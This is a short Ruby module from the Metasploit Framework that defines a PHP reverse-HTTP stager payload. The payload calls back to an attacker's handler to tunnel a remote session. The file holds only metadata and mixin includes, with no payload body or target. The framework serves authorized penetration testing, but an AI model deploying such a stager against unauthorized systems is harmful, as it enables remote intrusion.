##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Php::ReverseHttp

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'PHP Reverse HTTP Stager',
        'Description' => 'Tunnel communication over HTTP',
        'Author' => 'OJ Reeves',
        'License' => MSF_LICENSE,
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Handler' => Msf::Handler::ReverseHttp,
        'Stager' => { 'Payload' => '' }
      )
    )
  end
end
